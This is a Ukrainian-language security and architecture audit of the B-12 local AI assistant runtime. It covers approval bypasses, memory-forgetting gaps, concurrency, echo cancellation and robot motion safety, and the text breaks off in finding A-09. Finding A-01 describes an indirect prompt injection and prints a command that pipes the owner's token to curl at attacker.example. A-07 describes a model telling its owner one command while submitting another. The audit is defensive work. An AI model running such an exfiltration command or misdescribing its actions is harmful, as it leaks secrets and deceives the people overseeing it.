# Незалежний критичний архітектурний аудит B-12 (Elephant-Goldfish Model)

- **Дата проведення:** 2026-11-02
- **Базова ревізія Git:** `c1cfecc` (`main`)
- **Методологія:** Elephant-Goldfish Model (EGM) — тріада незалежних субагентів-рецензентів у чистих ізольованих контекстах з подальшою перехресною верифікацією кодової бази:
  1. **Goldfish 1 (Security & Memory Auditor)** — Домени 1 та 2.
  2. **Goldfish 2 (Autonomy & Runtime Concurrency Auditor)** — Домени 3 та 6.
  3. **Goldfish 3 (Voice, Duplex & Robotics Safety Auditor)** — Домени 4 та 5.

---

## Класифікація та матриця критичності

Усі виявлені проблеми впорядковані за рівнем критичності (**Critical → High → Medium**) та практичною важливістю й чітко поділені на три класи:
- **Архітектурний недолік (`Architectural Flaw`)** — структурна прогалина в дизайні взаємодії підсистем або меж довіри, яка не вирішується однорядковою правкою без зміни протоколу між компонентами.
- **Помилка реалізації (`Implementation Bug`)** — дефект у конкретному методі чи SQL/асинхронному потоці, де код порушує власний контракт або специфікацію.
- **Непідтверджене припущення (`Unverified Assumption`)** — властивість, заявлена або очікувана системою, яка не підтверджена виконанням у реальних фізичних чи часових умовах.

| ID | Домен | Назва проблеми | Клас проблеми | Критичність | Статус перевірки виконанням |
|---|---|---|---|---|---|
| **A-01** | 1. Межі довіри | Безумовна видача `full_execution=True` у звичайних чатових ходах разом із `run_command` (`/bin/bash -c`) обходить `approvals`, `network_allow` та `_names_protected` | Архітектурний недолік | **Critical** | Підтверджено інспекцією коду (відсутній негативний тест) |
| **A-02** | 6. Конкурентність | Відсутність міжпроцесної координації між `b12 serve` та прямими викликами CLI (`b12 memory forget`, `b12 chat`, `b12 approve`, `b12 goals`) ламає інвалідацію активних ходів | Архітектурний недолік | **Critical** | Підтверджено інспекцією коду |
| **A-03** | 2. Пам'ять / Забуття | Втрата транзитивних `tags` доказів при цитуванні фактів із `history_messages` сесії та збереження неповних (`cancelled`/`failed`) ходів у `SessionStore` | Архітектурний недолік | **Critical** | Частково (коміт `failed` ходу підтверджений тестом; витік між ходами не тестований) |
| **A-04** | 3. Автономність / 2. Забуття | Збереження `result.content` у `goals.checkpoint` без прив'язки до `result.evidence_ids` залишає забуті факти у відкритому вигляді в `goals.sqlite3` після `forget` | Помилка реалізації | **Critical** | Підтверджено інспекцією коду |
| **A-05** | 4. Голос / 2. Забуття | Відключений життєвий цикл `SpeakerStore` у `open_runtime`, `PurgeCoordinator` та `Operations.purge_snapshots` / `restore` (відновлення видаленої біометрії зі знімків) | Помилка реалізації | **Critical** | Підтверджено інспекцією коду (у тесті `test_duplex.py:69` хук підставляється вручну) |
| **A-06** | 4. Голос / Duplex | Десинхронізація та втрата фази reference-буфера у `AcousticEchoCanceller` при роботі з `AudioPlayer.play` та неможливість знайти затримку `>16 мс` на 32-мс фреймах | Архітектурний недолік + Помилка реалізації | **Critical** | Підтверджено математично та інспекцією коду (не тестувалось на реальному аудіо) |
| **A-07** | 1. Межі довіри | Сліпа черга підтверджень (`pending_approvals`) зберігає лише SHA-256 `digest` і приховує від власника `executable`, `argv`, `cwd` та `declared_effects` | Архітектурний недолік | **High** | Підтверджено інспекцією коду |
| **A-08** | 1. Межі довіри | Безумовна перевірка `actor.consent` у `ControlStore.check` повністю блокує всі інструменти (навіть `current_time`) для гостей та власника при `consent=False` | Помилка реалізації | **High** | Підтверджено інспекцією коду |
| **A-09** | 2. Пам'ять / Забуття | `Operations.purge_snapshots` не очищує `semantic/vectors.sqlite3`, а `Operations.restore` пропускає повторний `forget` через перевірку `is_live() == False` | Помилка реалізації | **High** | Підтверджено інспекцією коду |
| **A-10** | 2. Походження фактів | Жорсткий зовнішній ключ `evidence.evidence_id REFERENCES memories(id)` унеможливлює збереження спогадів із посиланням на документ `KnowledgeIndex` та їх інвалідацію | Архітектурний недолік | **High** | Підтверджено інспекцією коду |
| **A-11** | 3. Автономність | Безумовний запис `last_reflection` до запуску рефлексії та детерміноване дублювання однакових гіпотез `kind="reflection"` кожні 6 годин при `seed=42, temp=0.0` | Помилка реалізації + Архітектурний недолік | **High** | Підтверджено інспекцією коду |
| **A-12** | 3. Автономність / 6. Стабільність | Ігнорування `timeout_s` (`deadline=None`) у `Reflector.reflect` та гонка TOCTOU у `Scheduler._busy` дозволяють фоновій рефлексії заблокувати `model_lock` перед живим користувачем | Помилка реалізації | **High** | Підтверджено інспекцією коду |
| **A-13** | 4. Голос / Duplex | Хибне спрацювання детектора `double_talk` на багатопроменевому кімнатному відлунні (RIR) та недовизначена матриця Грама (`64` вибірки на `128` ваг) у `_nlms_block_filter` | Помилка реалізації | **High** | Підтверджено інспекцією коду |
| **A-14** | 4. Голос / Duplex | Відсутність неперервного full-duplex циклу читання мікрофона під час `DuplexSession.handle_duplex_utterance` та повна відсутність інтеграції `DuplexSession` у CLI/API/Web | Архітектурний недолік | **High** | Підтверджено інспекцією коду |
| **A-15** | 4. Голос / SLO | Перевищення цільової затримки `<1,5 с` на CPU (`~3,2–4,3 с` E2E) та витік фраз тестового корпусу (`evals/voice/report.json`) у продакшн-промпт `WhisperAsr` | Непідтверджене припущення + Помилка реалізації | **High** | Затримка підтверджена у `evals/voice/report.json`; реальний WER на живому голосі не перевірений |
| **A-16** | 5. Робототехніка | Обхід обмеження швидкості `max_speed_deg_s` у `MotionController._safe` (`duration_s = 1.0`) та застрягання у стані `"moving"` / падіння `on_disconnect()` при помилці транспорту | Помилка реалізації | **High** | Підтверджено інспекцією коду (приховано поведінкою `SimulatedRobot`) |
| **A-17** | 6. Скасування операцій | Виклик `cancel_turn` для ходу в стані `awaiting_approval` залишає неочищеними запис у таблиці `SessionStore.checkpoints` та словник `Agent._waiting` | Помилка реалізації | **High** | Підтверджено інспекцією коду |
| **A-18** | 1. Межі довіри | Відкликання гостьового токена (`revoke_tokens`) не відкликає видані `grants`, не інкрементує `actors.revision` і не зупиняє активний хід гостя; `/api/voice/*` відкриті без capabilities | Помилка реалізації | **Medium** | Підтверджено інспекцією коду |
| **A-19** | 1. Межі довіри (MCP) | Передача повного `os.environ` із секретами хоста у підпроцеси `McpServer.start` та підключення мутуючих MCP-інструментів у режимі `host_access="read_only"` | Помилка реалізації | **Medium** | Підтверджено інспекцією коду |
| **A-20** | 2. Кеші моделі / RAM | Залишкові токени в модульному `lru_cache` `_forms(term)`, повторне завантаження контексту в KV-кеш Ollama на наступному раунді того ж ходу після `memory_forget` та відсутність фонового `purge.resume()` | Помилка реалізації | **Medium** | Підтверджено інспекцією коду |
| **A-21** | 3. Автономність / Агент | Хибне спрацювання регулярного виразу `_PSEUDO_CALL` на згадки функцій у технічних відповідях моделі, сиротинські сесії цілей та неможливість відновити ціль після `approval_pending` | Помилка реалізації + Архітектурний недолік | **Medium** | Підтверджено інспекцією коду |
| **A-22** | 4. Голос / Speaker ID | Тривіальний обхід anti-replay у `SpeakerVerifier` зміною молодшого біта PCM16, затирання попереднього ембедінгу при повторному `enroll` та блокування `sentence_queue.put` при скасуванні | Помилка реалізації | **Medium** | Підтверджено інспекцією коду |
| **A-23** | 5. Робототехніка | Безстроковий `lease` у `MotionController` без TTL/watchdog, відсутність виклику `MotionController.stop()` при голосовому barge-in та відсутність фізичних випробувань R15/R16 | Архітектурний недолік + Непідтверджене припущення | **Medium** | Підтверджено інспекцією коду; апаратні тести R15/R16 не проводились |
| **A-24** | 6. Стабільність | Синхронне блокування основного `asyncio` event loop під час `Operations.create_snapshot` / `purge_snapshots` та необмежений ріст `Agent._session_locks`, `_volatile`, `_waiting` | Архітектурний недолік | **Medium** | Підтверджено інспекцією коду |

---

## Детальний розбір виявлених проблем (за критичністю)

---

### A-01. Безумовна видача `full_execution=True` у звичайних чатових ходах разом із `run_command` (`/bin/bash -c`) обходить `approvals`, `network_allow` та `_names_protected`
- **Класифікація:** Архітектурний недолік (`Architectural Flaw`)
- **Критичність:** **Critical** (Домен 1: Межі довіри)
- **Посилання на файли та компоненти:**
  - [src/b12/api.py](../../src/b12/api.py#L375-L388) — `chat` (`runtime.control.issue_grant` із `full_execution=who.owner and "process.execute" in who.capabilities`).
  - [src/b12/control.py](../../src/b12/control.py#L509-L511) — `ControlStore.prepare` (`needs_approval = approval_required or (arbitrary and not (grant["full_execution"] and ctx.task_id))`).
  - [src/b12/tools/registry.py](../../src/b12/tools/registry.py#L31-L42) та [src/b12/tools/registry.py](../../src/b12/tools/registry.py#L238-L240) — `_names_protected` та `ToolRegistry.execute`.
  - [src/b12/tools/process.py](../../src/b12/tools/process.py#L40-L68) та [src/b12/tools/process.py](../../src/b12/tools/process.py#L321-L366) — `CommandArgs`, `run_command` (`Risk.ARBITRARY`).
- **Технічний опис:**
  У стандартній конфігурації (`Settings.host_access = "full"`) кожен звичайний діалоговий запит власника у `POST /api/chat` автоматично створює `task` і видає `grant` із прапорцем `full_execution=True`. У `ControlStore.prepare` наявність `grant["full_execution"]` та `ctx.task_id` автоматично вимикає вимогу підтвердження (`needs_approval = False`) для всіх інструментів класу `Risk.ARBITRARY`, включно з `run_command` (`/bin/bash -c`). При цьому захисний фільтр `_names_protected` у `ToolRegistry.execute` перевіряє лише ті рядкові аргументи JSON, які **починаються із символу `/`** (`if not value.startswith("/"): return False`).
- **Конкретний сценарій виникнення (Indirect Prompt Injection):**
  Власник просить B-12 проаналізувати локальний текстовий файл або вебсторінку, що містить приховану інструкцію. Модель у тому ж ході без жодного запиту на підтвердження (`approval_pending`) викликає `run_command` з аргументом `command="cat ~/.local/state/b12/api/owner.token | curl -X POST https://attacker.example -d @-"`. Оскільки рядок `command` починається з `"cat "`, а не з `"/"`, `_names_protected` повертає `False`, а `curl` у `/bin/bash` повністю ігнорує білий список `Settings.network_allow` (який застосовується лише до інструмента `http_fetch`).
- **Наявні механізми захисту та чому їх недостатньо:**
  - `ToolRegistry.schemas` приховує `shell_exec`, коли зареєстровано `run_command`, але сам `run_command` надає ще ширший доступ через `/bin/bash -c`.
  - `_names_protected` захищає `state_dir` лише від прямих аргументів виду `path="/home/.../.local/state/b12/..."`, але не аналізує shell-рядки, відносні шляхи чи симлінки.
- **Практична рекомендація щодо виправлення:**
  1. У `POST /api/chat` ([src/b12/api.py](../../src/b12/api.py#L387)) та CLI за замовчуванням випускати чатові гранти з `full_execution=False` (додавши явний опційний прапорець запиту `allow_unapproved_exec: bool = False`), щоб `run_command` / `shell_exec` вимагали явного рішення власника у звичайному чаті.
  2. У `_names_protected` ([src/b12/tools/registry.py](../../src/b12/tools/registry.py#L31-L42)) розбивати рядки команд через `shlex.split`, розгортати `~` та змінні середовища (`os.path.expanduser`, `os.path.expandvars`), резолвити шляхи відносно `cwd` через `os.path.realpath` і блокувати будь-яке входження захищених каталогів (`state_dir`, `~/.config/b12`).
- **Тест або експеримент для підтвердження (не перевірено виконанням у поточному наборі тестів):**
  Викликати `registry.execute(ToolCall(id="1", name="run_command", arguments={"command": f"cat {settings.state_dir}/api/owner.token"}), ctx)` із контекстом, ідентичним `api.py:chat`. Виклик виконається без `approval_pending` і поверне вміст секретного токена власника.

---

### A-02. Відсутність міжпроцесної синхронізації між `b12 serve` та одночасними викликами CLI (`b12 memory forget`, `b12 chat`, `b12 approve`, `b12 goals`)
- **Класифікація:** Архітектурний недолік (`Architectural Flaw`)
- **Критичність:** **Critical** (Домен 6: Конкурентний доступ і скасування операцій)
- **Посилання на файли та компоненти:**
  - [src/b12/service.py](../../src/b12/service.py#L53-L68) — `RuntimeLock`.
  - [src/b12/api.py](../../src/b12/api.py#L236) — `lifespan` (захоплює `RuntimeLock`).
  - [src/b12/cli.py](../../src/b12/cli.py#L84-L91) — `open_or_fail` (відкриває другий локальний `Runtime` без перевірки `RuntimeLock`).
  - [src/b12/purge.py](../../src/b12/purge.py#L88-L91) — хук `active_turns` у `PurgeCoordinator._hook`.
  - [src/b12/memory.py](../../src/b12/memory.py#L569-L582) — `MemoryStore._attempt_cleanup_canonical` (`PRAGMA busy_timeout=0`).
- **Технічний опис:**
  Ексклюзивний файловий лок `RuntimeLock` (`state_dir/runtime.lock`) перевіряється лише при старті `b12 serve` та під час `Operations.restore`. Усі інші команди CLI (`b12 memory forget`, `b12 chat`, `b12 resume`, `b12 approve`, `b12 goals`) напряму викликають `open_runtime(settings)` у власному процесі ОС паралельно з працюючим демоном `b12 serve`. Оскільки структури керування активними ходами (`Agent.active`, `Agent._volatile`, `Agent._waiting`, `ControlStore._runtime`) живуть у RAM окремого процесу Python, CLI-процес працює зі своїми порожніми словниками.
- **Конкретний сценарій виникнення:**
  1. У фоновому сервісі `b12 serve` триває довгий хід (або фонова ціль), який завантажив у контекст спогад `M1`.
  2. Власник у терміналі виконує `b12 memory forget <M1>`.
  3. CLI-процес викликає `self.agent.invalidate_active(actor.id)` у **своєму порожньому** екземплярі `Agent`, не зупиняючи активний хід у процесі `b12 serve`. Більше того, через активне з'єднання `b12 serve` із `memory.sqlite3`, виклик `PRAGMA wal_checkpoint(TRUNCATE)` із `busy_timeout=0` у CLI отримує `busy=1`, залишаючи `canonical` у стані `pending`, а хід у `b12 serve` успішно завершується і записує забутий факт в історію сесії.
- **Наявні механізми захисту та чому їх недостатньо:**
  `MemoryStore._verify_audit` відстежує `PRAGMA data_version` на диску, але in-memory стан `Agent.active` та `Agent._volatile` не синхронізується між процесами.
- **Практична рекомендація щодо виправлення:**
  У `cli.py:open_or_fail` перевіряти неблокуючим `flock`, чи утримується `state_dir/runtime.lock` процесом `b12 serve`. Якщо сервер активний — маршрутизувати команди CLI (`chat`, `resume`, `approve`, `deny`, `memory`, `goals`, `status`, `backup`) через локальний HTTP API (`127.0.0.1:8712` з `owner.token`), як це вже реалізовано для `b12 tui`.
- **Тест або експеримент для підтвердження:**
  Запустити `b12 serve`, ініціювати тривалий хід через `POST /api/chat` зі спогадом `M1`, і під час його виконання запустити в окремому процесі `b12 memory forget <M1>`. Перевірити, що хід у `b12 serve` не отримує сигнал `cancel`.

---

### A-03. Втрата транзитивних `tags` доказів між ходами однієї сесії та збереження скасованих/аварійних ходів у `SessionStore`
- **Класифікація:** Архітектурний недолік (`Architectural Flaw`)
- **Критичність:** **Critical** (Домен 2: Цілісність пам'яті та транзитивне забуття)
- **Посилання на файли та компоненти:**
  - [src/b12/agent.py](../../src/b12/agent.py#L584-L603) — `Agent._drive -> finish`.
  - [src/b12/agent.py](../../src/b12/agent.py#L666-L670) — підвантаження `self.history_messages(context.session_id, actor)`.
  - [src/b12/sessions.py](../../src/b12/sessions.py#L230-L257) — `SessionStore.purge_evidence`.
  - [src/b12/context.py](../../src/b12/context.py#L247-L250) — `_message_groups`.
- **Технічний опис:**
  1. **Втрата тегів при цитуванні з історії сесії:** Коли в сесії виконується хід `T2`, `Agent._drive` подає в модель останні 20 ходів через `self.history_messages(context.session_id, actor)`, але **не переносить `tags` доказів цих історичних ходів у `state["tags"]` ходу `T2`**. Якщо модель у ході `T2` відповідає користувачу, цитуючи секретний факт із повідомлень попереднього ходу `T1` (без нового виклику `memory_search` і без влучання `_recall` за коротким запитом типу «Повтори попередній пункт»), хід `T2` зберігається в `sessions.sqlite3` без тегу спогаду `M1`.
  2. **Збереження скасованих/аварійних ходів:** Всупереч §7 специфікації та docstring `agent.py:5-7`, функція `finish()` у `Agent._drive` при `status in ("failed", "cancelled")` та `len(state["turn_messages"]) > 1` додає синтетичне повідомлення від імені `role: "user"` (`"[хід не завершено: ...]"`), викликає `self._commit(...)` і лише після цього викликає `self.control.cancel_turn(...)`. Це також створює в історії сесії два повідомлення `role: "user"` підряд.
- **Конкретний сценарій виникнення:**
  У ході `T1` користувач просить запам'ятати пароль `M1`. У ході `T2` користувач пише: «Напиши його ще раз великими літерами». Модель бере пароль із історії ходу `T1` у вікні контексту. Потім користувач викликає `forget(M1)`. Хід `T1` видаляється через `SessionStore.purge_evidence`, а хід `T2` із паролем великими літерами назавжди залишається в `sessions.sqlite3`.
- **Наявні механізми захисту та чому їх недостатньо:**
  `_recall` та `_tags_from` тегують лише прямі влучання поточного ходу, ігноруючи те, що `history_messages` вже вносить у контекст докази попередніх ходів сесії.
- **Практична рекомендація щодо виправлення:**
  1. При завантаженні `history_messages` для активного вікна сесії об'єднувати (`union`) живі `tags` тих історичних ходів, які увійшли в контекст генерації, зі `state["tags"]` поточного ходу (або зберігати посилання на батьківські `turn_id` сесії для каскадного очищення).
  2. Не викликати `self._commit(...)` при `status == "cancelled"`, а для перерваних ходів (якщо потрібне збереження чорновика) не використовувати `role: "user"` для технічного повідомлення про помилку.
- **Тест або експеримент для підтвердження:**
  Виконати в одній сесії хід `T1` (запис `M1`), потім хід `T2` із запитом `"Повтори сказане вище"`, де `_recall` не повертає `M1`, викликати `purge.forget(M1.id, actor.id)` і перевірити `sessions.history(session_id, actor.id)` — хід `T2` залишиться в базі.

---

### A-04. Пропуск каскадного видалення (`R05`) у `GoalStore.checkpoint` при виконанні фонових цілей
- **Класифікація:** Помилка реалізації (`Implementation Bug`)
- **Критичність:** **Critical** (Домен 3: Автономність / Домен 2: Забуття)
- **Посилання на файли та компоненти:**
  - [src/b12/autonomy.py](../../src/b12/autonomy.py#L98-L134) — `Scheduler.run_goal`.
  - [src/b12/goals.py](../../src/b12/goals.py#L157-L178) — `GoalStore.checkpoint`.
  - [src/b12/goals.py](../../src/b12/goals.py#L276-L298) — `GoalStore.purge_evidence`.
- **Технічний опис:**
  Під час виконання фонової цілі у `Scheduler.run_goal` текст відповіді моделі `checkpoint = f"[{result.state}] {result.content}"[:4000]` записується в `goals.checkpoint` через `rt.goals.checkpoint(goal["id"], actor.id, checkpoint, ...)`. Проте `result.evidence_ids` (спогади та документи, які модель використала під час цього ходу) передаються лише у `rt.goals.add_proposal(...)`, але **ніколи не додаються у `goals.tags` або `goals.evidence_ids`**.
- **Конкретний сценарій виникнення:**
  Фонова ціль під час `scheduler.tick()` знаходить через `_recall` або `memory_search` приватний спогад `M1` і цитує його у `result.content`, який зберігається в `goals.checkpoint` (наприклад, на кроці 1 з 3, коли `proposal` ще не створюється, або коли `proposal` пізніше видаляється). Коли власник викликає `b12 memory forget <M1>`, `GoalStore.purge_evidence` перевіряє `goals.tags` і `goals.evidence_ids`, не знаходить там `M1`, і залишає текст забутого спогаду в полі `goals.checkpoint`.
- **Наявні механізми захисту та чому їх недостатньо:**
  `GoalStore.purge_evidence` вміє видаляти цілі за `goals.tags`, але метод `GoalStore.checkpoint()` взагалі не приймає параметр `tags` і не оновлює `goals.tags`.
- **Практична рекомендація щодо виправлення:**
  Додати параметр `tags: dict[str, str] | None = None` у `GoalStore.checkpoint(...)` та атомарно доповнювати JSON-поле `goals.tags` усіма `result.evidence_ids` (зі збереженням їх реального типу `memory` / `document` із `state["tags"]`), які були задіяні під час ходу.
- **Тест або експеримент для підтвердження:**
  Створити ціль із `budget_turns=3`, зберегти спогад `M1` із маркером `SECRET_GOAL_TEXT`, виконати 1 тік `scheduler.run_goal`, викликати `runtime.purge.forget(M1.id, owner.id)` і перевірити `runtime.goals.get(goal_id, owner.id)["checkpoint"]` — маркер залишиться у базі.

---

### A-05. Розірваний життєвий цикл голосової біометрії `SpeakerStore` у `open_runtime`, `PurgeCoordinator` та знімках `Operations`
- **Класифікація:** Помилка реалізації (`Implementation Bug`)
- **Критичність:** **Critical** (Домен 4: Голос / Домен 2: Забуття та бекапи)
- **Посилання на файли та компоненти:**
  - [src/b12/runtime.py](../../src/b12/runtime.py#L88-L97) — `open_runtime` (створення `PurgeCoordinator` без `speakers`).
  - [src/b12/purge.py](../../src/b12/purge.py#L17-L53) та [src/b12/purge.py](../../src/b12/purge.py#L77-L111) — `STORES`, `forget_voice_profile`, `_hook`.
  - [src/b12/service.py](../../src/b12/service.py#L34-L43) та [src/b12/service.py](../../src/b12/service.py#L172-L254) — `_files`, `Operations.purge_snapshots`, `Operations.restore`.
  - [src/b12/audio/speaker.py](../../src/b12/audio/speaker.py#L168-L172) — `SpeakerStore.purge_evidence`.
- **Технічний опис:**
  1. У `open_runtime` об'єкт `SpeakerStore` не створюється і не передається в `PurgeCoordinator` (`runtime.purge.speakers` завжди `None`). У тесті `tests/integration/test_duplex.py:69` це замасковано ручним присвоєнням `runtime.purge.speakers = store`.
  2. Функція `_files` у `service.py` копіює `state_dir/voice/speakers.sqlite3` у кожен backup-знімок (`snapshots/<id>/voice/speakers.sqlite3`), але ні `Operations.purge_snapshots`, ні `Operations.restore`, ні `DELETE /api/voice/speaker/{actor_id}` ([src/b12/api.py](../../src/b12/api.py#L699-L710)) не записують видалення біометрії в `deletions.jsonl` і не видаляють запис зі знімків.
- **Конкретний сценарій виникнення:**
  Власник або гість реєструє голосовий відбиток через `/api/voice/speaker/enroll`, створюється системний snapshot, після чого профіль видаляється через `DELETE /api/voice/speaker/{actor_id}`. При наступному виклику `b12 backup restore` біометричний вектор `speakers.sqlite3` мовчки відновлюється зі знімка в робочий стан.
- **Наявні механізми захисту та чому їх недостатньо:**
  У `SpeakerStore` увімкнено `PRAGMA secure_delete = ON` і реалізовано `delete_profile` / `purge_evidence`, але вони відірвані від `open_runtime` та `Operations`.
- **Практична рекомендація щодо виправлення:**
  Підключити `SpeakerStore(root / "voice" / "speakers.sqlite3")` у `open_runtime`, додати очищення `voice/speakers.sqlite3` у `Operations.purge_snapshots` і записувати видалення голосового профілю в `operations.record_deletion` для повторного застосування під час `restore()`.
- **Тест або експеримент для підтвердження:**
  Викликати `runtime.purge.forget_voice_profile(owner.id)` на стандартному `open_runtime(settings)` без ручного патчингу `runtime.purge.speakers` — метод поверне `False` і залишить запис у `voice/speakers.sqlite3`.

---

### A-06. Десинхронізація reference-буфера NLMS AEC з реальним відтворенням `AudioPlayer.play` та неможливість компенсації затримки `>16 мс` на 32-мс фреймах
- **Класифікація:** Архітектурний недолік + Помилка реалізації
- **Критичність:** **Critical** (Домен 4: Повнодуплексна взаємодія та AEC)
- **Посилання на файли та компоненти:**
  - [src/b12/audio/tts.py](../../src/b12/audio/tts.py#L461-L463) та [src/b12/audio/tts.py](../../src/b12/audio/tts.py#L504-L524) — `AudioPlayer.play`.
  - [src/b12/audio/aec.py](../../src/b12/audio/aec.py#L177-L221) — `AcousticEchoCanceller.feed_render_reference` та `_align_reference`.
  - [src/b12/audio/duplex.py](../../src/b12/audio/duplex.py#L45-L60) — `DuplexSession.__init__` (`use_system_webrtc_aec`).
- **Технічний опис:**
  1. **Миттєвий скид усього буфера референсу до старту звуку:** `AudioPlayer.play` передає весь аудіомасив речення (наприклад, 3–5 секунд = 48 000–80 000 семплів) у `self.on_render_reference(...)` **до** запуску підпроцесу `pw-play`/`aplay`. На кожному вхідному фреймі мікрофона довжиною `n` метод `_align_reference` відрізає `self._ref_buffer[:n]` і безповоротно видаляє ці `n` семплів (`self._ref_buffer = self._ref_buffer[n:]`). Оскільки запуск підпроцесу `pw-play` і буферизація PipeWire/ALSA займають 60–180 мс, перші фрейми мікрофона містять тишу, але з'їдають початок `self._ref_buffer`, через що референс і мікрофон назавжди розходяться у часі.
  2. **Обмеження `max_lag = min(self.max_delay_samples, n // 2)`:** На стандартних стримінгових фреймах VAD по `n = 512` семплів (32 мс при 16 кГц) максимальний лаг пошуку становить `n // 2 = 256` семплів (**лише 16 мс**), а при `best_lag > 0` зсув `aligned[best_lag:] = raw_ref[:n - best_lag]` викидає хвіст `best_lag` семплів на кожному фреймі, руйнуючи фазу сигналу.
  3. **Неактивний `PulseAudioWebRtcAec`:** Навіть при передачі `use_system_webrtc_aec=True` у `DuplexSession`, метод `self.system_aec.start()` ніде не викликається, а `pw-play`/`pw-record` не перенаправляються у `b12_aec_sink` / `b12_aec_source`.
- **Конкретний сценарій виникнення:**
  Під час реального відтворення фрази через динамік ноутбука з типовою затримкою тракту PipeWire 80 мс (1280 семплів) та читанням мікрофона фреймами по 512 семплів `AcousticEchoCanceller` шукає кореляцію лише у вікні 0..16 мс, не знаходить її, пропускає нескомпенсоване відлуння динаміка у VAD і викликає миттєвий хибний self-barge-in.
- **Наявні механізми захисту та чому їх недостатньо:**
  У `evals/voice/duplex/run_duplex_eval.py` в `process_capture` передається весь 1,8-секундний буфер одним шматком (`n = 28 800`) зі штучною затримкою рівно 2 семпли (0,125 мс), тому дефект `n // 2` та буферизації `pw-play` на синтетичному тесті не проявляється.
- **Практична рекомендація щодо виправлення:**
  Зберігати у `AcousticEchoCanceller` кільцеву історію відтвореного сигналу на останні 250–300 мс (4000–4800 семплів) і в `_align_reference` шукати `best_lag` між поточним фреймом мікрофона `mic` (довжини `n`) та вікном історії референсу без втрати `best_lag` семплів між сусідніми блоками; подавати референс із `AudioPlayer` синхронно з фактичним часом старту аудіопотоку.
- **Тест або експеримент для підтвердження:**
  Подати 2 секунди референсу в `aec.feed_render_reference`, змоделювати затримку тракту 60 мс (960 семплів) і передати мікрофонний сигнал фреймами по `512` семплів у `aec.process_capture`. Виміряний `erle_db` впаде з `30 дБ` до `~0 дБ`.

---

### A-07. Сліпа черга підтверджень (`pending_approvals`) приховує від власника аргументи виклику, шлях, команду та `declared_effects`
- **Класифікація:** Архітектурний недолік (`Architectural Flaw`)
- **Критичність:** **High** (Домен 1: Межі довіри та система підтверджень)
- **Посилання на файли та компоненти:**
  - [src/b12/control.py](../../src/b12/control.py#L96-L98) — схема таблиці `approvals`.
  - [src/b12/control.py](../../src/b12/control.py#L232-L242) та [src/b12/control.py](../../src/b12/control.py#L517-L527) — `pending_approvals` та `prepare`.
  - [src/b12/api.py](../../src/b12/api.py#L464-L476) — `GET /api/approvals`.
- **Технічний опис:**
  Специфікація (§15.4) вимагає *«reviewable approval exact executable/argv/cwd/declared effects»*. Проте таблиця `approvals` у `control.sqlite3` зберігає лише `operation_id, name, digest, decision, expires_at`, а `GET /api/approvals` та CLI `b12 status` повертають лише назву інструмента (`name`, наприклад `"sudo_exec"` або `"file_delete"`) та UUID операції без жодних аргументів.
- **Конкретний сценарій виникнення (Confused Deputy):**
  Модель у чаті повідомляє власнику: «Я запущу `sudo_exec` для перевірки `ufw status`, підтвердьте запит», але в аргументах `ToolCall` передає іншу команду. Власник у черзі підтверджень бачить лише `sudo_exec` та UUID операції без `executable`/`argv`/`cwd`.
- **Наявні механізми захисту та чому їх недостатньо:**
  SHA-256 `digest` захищає від підміни аргументів між `prepare()` та `resume()`, але не дає власнику побачити, під чим саме він підписується.
- **Практична рекомендація щодо виправлення:**
  Додати в таблицю `approvals` поле `preview_json TEXT` (яке очищується `SET digest = NULL, preview_json = NULL` при `decide_approval` / `expire_approvals` / `cancel_turn` / `purge`) і повертати його в `pending_approvals()` та події `approval_pending`.
- **Тест або експеримент для підтвердження:**
  Викликати інструмент, що потребує підтвердження (`sudo_exec`), та перевірити вивід `runtime.control.pending_approvals()` — жоден аргумент виклику там не присутній.

---

### A-08. Помилкова перевірка `actor.consent` у `ControlStore.check` повністю блокує всі інструменти при `consent=False`
- **Класифікація:** Помилка реалізації (`Implementation Bug`)
- **Критичність:** **High** (Домен 1: Межі довіри та права)
- **Посилання на файли та компоненти:**
  - [src/b12/control.py](../../src/b12/control.py#L424-L425) — `ControlStore.check` (`if not actor["consent"]: raise ControlError("consent_required")`).
  - [src/b12/tools/registry.py](../../src/b12/tools/registry.py#L175-L178) та [src/b12/tools/registry.py](../../src/b12/tools/registry.py#L211) — `ToolRegistry.schemas` та `ToolRegistry.execute`.
- **Технічний опис:**
  За дизайном системи (§5, §11, §15.1) прапорець `consent` регулює **довготривале збереження даних (persistence)** у пам'яті та історії сесій, тоді як гості або власник із `consent=False` повинні мати змогу працювати у volatile-режимі з дозволеними їм не-персистентними інструментами (`time.read`, `system.read` тощо). Однак `ControlStore.check` безумовно викидає `ControlError("consent_required")` для будь-якого інструмента, якщо `not actor["consent"]`.
- **Конкретний сценарій виникнення:**
  Власник створює гостьовий токен із `consent=False` та `capabilities=["time.read", "system.read"]` (або тимчасово вимикає власний `consent` для приватної розмови). Усі інструменти миттєво зникають зі списку `registry.schemas(ctx)`, а будь-який виклик `current_time` завершується помилкою `consent_required`.
- **Наявні механізми захисту та чому їх недостатньо:**
  `MemoryStore`, `KnowledgeIndex` та `Agent._commit` уже мають власні перевірки `actor.consent`, тому глобальне блокування в `ControlStore.check` є надмірним і помилковим.
- **Практична рекомендація щодо виправлення:**
  Перевіряти `actor["consent"]` у `ControlStore.check` лише для capabilities запису/читання довготривалої пам'яті (`memory.read`, `memory.write`, `knowledge.read`).
- **Тест або експеримент для підтвердження:**
  Створити актора з `consent=False` і грантом на `time.read`, після чого викликати `registry.execute(ToolCall(id="1", name="current_time", arguments={}), ctx)` — виклик поверне `status="denied", error_code="consent_required"`.

---

### A-09. Неповне очищення резервних знімків (`purge_snapshots`) та пропуск видалення векторів `SemanticIndex` під час `Operations.restore`
- **Класифікація:** Помилка реалізації (`Implementation Bug`)
- **Критичність:** **High** (Домен 2: Резервні копії та транзитивне забуття)
- **Посилання на файли та компоненти:**
  - [src/b12/service.py](../../src/b12/service.py#L172-L219) — `Operations.purge_snapshots`.
  - [src/b12/service.py](../../src/b12/service.py#L221-L256) — `Operations.restore`.
- **Технічний опис:**
  Під час `Operations.create_snapshot()` у каталог знімка копіюється база `semantic/vectors.sqlite3`. Коли виконується `purge.forget(memory_id, actor_id)`, метод `Operations.purge_snapshots` видаляє спогад із `memory.sqlite3`, `sessions.sqlite3`, `goals.sqlite3` та `backups` усередині знімка, але **не видаляє ембедінги з `snapshots/<id>/semantic/vectors.sqlite3`**. Коли пізніше запускається `Operations.restore(snapshot_id, settings)`, цикл повторного накатування `deletions.jsonl` перевіряє `if runtime.memory.is_live(target, actor):`. Оскільки `memory.sqlite3` у знімку вже містить tombstone після `purge_snapshots`, `is_live()` повертає `False`, і `runtime.purge.forget()` пропускається!
- **Конкретний сценарій виникнення:**
